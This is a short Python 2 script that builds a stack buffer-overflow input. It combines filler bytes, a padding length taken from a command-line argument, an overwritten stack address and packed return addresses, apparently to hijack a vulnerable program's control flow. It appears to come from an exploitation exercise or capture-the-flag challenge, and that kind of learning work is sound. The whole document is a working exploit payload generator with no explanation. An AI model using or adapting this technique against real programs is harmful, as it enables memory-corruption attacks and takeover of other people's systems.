#!/usr/bin/python
import sys

name = "Jamie Floyd\x00"+ "A" * 56
i = "\x44\x00\x00\x00"
buff = "B"*int(sys.argv[1])
epb = "\xd8\xf6\xff\xbf"
payload = "\x95\x85\x04\x08\x80\xa0\x04\x08\x01"
print name+i+buff+epb+payload
